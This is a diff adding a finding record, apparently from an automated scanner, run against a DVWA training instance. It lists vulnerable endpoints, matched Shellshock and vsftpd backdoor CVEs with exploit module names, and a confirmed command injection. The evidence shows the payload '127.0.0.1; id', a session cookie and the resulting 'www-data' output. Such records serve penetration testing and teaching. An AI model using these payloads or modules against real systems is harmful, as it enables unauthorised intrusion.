@@ -1,0 +1,20 @@
+Target: 13.250.120.1:80
+Plugin: DVWA Command Injection
+CVE: DVWA-CMDI
+CVSS: 10.0
+Web endpoints found: [{"path": "/vulnerabilities/sqli/", "url": "http://13.250.120.1:80/vulnerabilities/sqli/", "status": 200, "vuln_type": "sqli"}, {"path": "/vulnerabilities/sqli_blind/", "url": "http://13.250.120.1:80/vulnerabilities/sqli_blind/", "status": 200, "vuln_type": "sqli_blind"}, {"path": "/vulnerabilities/xss_r/", "url": "http://13.250.120.1:80/vulnerabilities/xss_r/", "status": 200, "vuln_type": "xss_reflected"}, {"path": "/vulnerabilities/xss_s/", "url": "http://13.250.120.1:80/vulnerabilities/xss_s/", "status": 200, "vuln_type": "xss_stored"}, {"path": "/vulnerabilities/xss_d/", "url": "http://13.250.120.1:80/vulnerabilities/xss_d/", "status": 200, "vuln_type": "xss_dom"}, {"path": "/vulnerabilities/exec/", "url": "http://13.250.120.1:80/vulnerabilities/exec/", "status": 200, "vuln_type": "command_injection"}, {"path": "/vulnerabilities/fi/", "url": "http://13.250.120.1:80/vulnerabilities/fi/", "status": 200, "vuln_type": "lfi"}, {"path": "/vulnerabilities/upload/", "url": "http://13.250.120.1:80/vulnerabilities/upload/", "status": 200, "vuln_type": "file_upload"}, {"path": "/vulnerabilities/csrf/", "url": "http://13.250.120.1:80/vulnerabilities/csrf/", "status": 200, "vuln_type": "csrf"}, {"path": "/vulnerabilities/brute/", "url": "http://13.250.120.1:80/vulnerabilities/brute/", "status": 200, "vuln_type": "brute_force"}, {"path": "/vulnerabilities/weak_id/", "url": "http://13.250.120.1:80/vulnerabilities/weak_id/", "status": 200, "vuln_type": "weak_session"}, {"path": "/config/", "url": "http://13.250.120.1:80/config/", "status": 200, "vuln_type": "info_disclosure"}, {"path": "/phpinfo.php", "url": "http://13.250.120.1:80/phpinfo.php", "status": 200, "vuln_type": "info_disclosure"}, {"path": "/setup.php", "url": "http://13.250.120.1:80/setup.php", "status": 200, "vuln_type": "info_disclosure"}]
+RAG matches: [{"id": "CVE-2014-6271", "description": "Shellshock bash remote code execution via HTTP headers CGI", "cvss": "10.0", "service": "http", "verify_method": "http_header_inject", "version": "bash", "exploit_module": "exploit/multi/http/apache_mod_cgi_bash_env_exec"}, {"exploit_module": "exploit/unix/ftp/vsftpd_234_backdoor", "id": "CVE-2011-2523", "version": "2.3.4", "cvss": "10.0", "verify_method": "tcp_port_6200", "description": "vsftpd 2.3.4 backdoor via smiley face in username opens shell port 6200", "service": "vsftpd"}]
+Evidence:
+Command Injection thành công - RCE xác nhận.
+      - URL        : http://13.250.120.1:80/vulnerabilities/exec/
+      - Payload    : 127.0.0.1; id
+      - Cookie     : security=low; PHPSESSID=7608b40ns892sei04hpfsic255
+      - CMD Output : PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.045 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.055 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.045 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.044/0.047/0.055/0.000 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
